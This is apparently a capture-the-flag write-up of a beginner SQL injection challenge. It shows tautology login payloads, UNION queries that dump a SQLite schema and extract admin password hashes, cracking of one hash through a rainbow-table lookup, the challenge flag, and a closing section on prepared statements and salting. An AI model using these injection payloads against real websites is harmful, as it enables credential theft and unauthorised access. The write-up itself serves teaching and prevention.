## About the Challenge
As mentioned in the title, this is a basic SQL injection challenge. It features a login and register portal, as well as a admin login portal.
![babysql1](/static/writeups/photos/babysql1.png)

## Solve Process
The solving process for most blind SQLI challenges are 
1. Find the part of the website vulnerable to SQLI
2. Find out the information of each table in the database
3. Leak the information of the relevant tables

## Finding the part of the website vulnerable to SQLI
First we can test for sqli within the login portals. If the login is vulnerable to SQLI, then the query
would look something like **`SELECT username,password from users WHERE username = "$username" AND password = "$password"`**

We can test the sqli using the following payloads (in either username or password fields)
```sql
' OR 1 = 1 --
" OR 1 = 1 --
```

If it was vulnerable, then we would be able to easily login as admin. Unfortunately, testing on the login and admin login pages does not result in a successful SQLI. 

We can then signup and login to see what other pages there are on the website.
![babysql2](/static/writeups/photos/babysql2.png)

There is a search page on the website. Testing the search field with the above payload returns all the products. This means that sqli is present in the search field.

## Finding the information of each table in the database
You can refer to [Hacktricks](https://book.hacktricks.xyz/pentesting-web/sql-injection#identifying-back-end) to check the backend used by the database. I assumed it was sqlite as it is usually used for simple sqli challenges.

For sqlite, the database schema is stored in the **`sqlite_master`** table. Specifically, we can select the **`sql`** column for all rows who have a **`type`** of **`"table"`**
```sql
SELECT `sql` FROM `sqlite_master` WHERE `type` = `table`
```

We can guess that the SQL run for the search function looks like this:
```sql
SELECT * FROM `products` WHERE `name` = '$name'
```

We can use a **UNION** query to "join" the results from the initial select with that of the database scheme. 
Take note that **UNION** requires the number of columns in both SELECT statements to be the same. We can keep adding
columns until the code executes successfully. In this case, it is 3 columns.
```sql
dadsdad' UNION SELECT `sql`,`sql`,`sql` FROM `sqlite_master` WHERE `type` = 'table' --
```

This turns the resultant final query into
```sql
SELECT * FROM `products` WHERE `name` = 'dadsdad' UNION SELECT `sql`,`sql`,`sql` FROM `sqlite_master` WHERE `type` = 'table' --
```

With that, we can find the tables in the database*:
```sql
CREATE TABLE PRIV_USERS( id SERIAL PRIMARY KEY, username varchar(255) UNIQUE NOT NULL, password varchar(255) UNIQUE NOT NULL, is_admin INTEGER DEFAULT 1 )

CREATE TABLE PRODUCTS( id SERIAL PRIMARY KEY, description varchar(255) UNIQUE NOT NULL, price varchar(255) UNIQUE NOT NULL )

CREATE TABLE USERS_ZAHSHBSH( id SERIAL PRIMARY KEY, username varchar(255) UNIQUE NOT NULL, password varchar(255) UNIQUE NOT NULL, is_admin INTEGER DEFAULT 0 )
```

## Extracting data from the tables
The most notable table is the **`PRIV_USERS`** table, which likely contains our admin usernames and password. Using the same UNION idea, we
can extract the data from the **`PRIV_USERS`** table.
```sql
dadsdad' UNION SELECT 1,`username`,`password` FROM `PRIV_USERS` --
```

This results in
```text
Cisco
Price: 811f1895d782af1ef9bf4d42d1710878ff47b2ba6768e914ca7c8220c97f2572

Leon
Price: e0e6097a6f8af07daf5fc7244336ba37133713a8fc7345c36d667dfa513fabaa

Rigby
Price: cd9ba90df3442e4eea37ec219a769562959f36f4064603e88002ea426ec0a11a
```

## Getting the admin password
The passwords come in the form of hex values. Database passwords are typically hashed to prevent hackers from infiltrating and reading each user's passwords. 

The length of this hash is 64, which is translates to 256 bits. The most common 256 bit hash is SHA256. Though hashes are typically non-reversable, if an admin user uses a common password, then one can use a [Rainbow Table](https://en.wikipedia.org/wiki/Rainbow_table) to reverse the hash. 

We can check if we can reverse each hash using a [SHA256 decoding website](https://10015.io/tools/sha256-encrypt-decrypt). 
Checking each hash, we find out that the **`Rigby`** user uses a common password of **`knightrider`**

Thus, we can login as the admin user Rigby and retrieve the flag.

## Flag
```text
blahaj{sQLi_iS_c00l}
```

## Note
* The first column in the products table is the id. The id is not displayed on the website, so if you do not see the SQL schema, this is likely why. 

## Prevention
SQLI can be prevented by using prepared statements
```sql
SELECT * FROM `products` WHERE `name` = ?
```

Passwords should be hashed with a [salt](https://www.hypr.com/security-encyclopedia/salt#:~:text=A%20salt%20is%20a%20piece,passwords%20before%20they%20are%20stored.). A salt is a string of random characters appended to a password to prevent the hash from being easily looked up on a rainbow table.

## Resources
[SQL Injection (HackTricks)](https://book.hacktricks.xyz/pentesting-web/sql-injection)


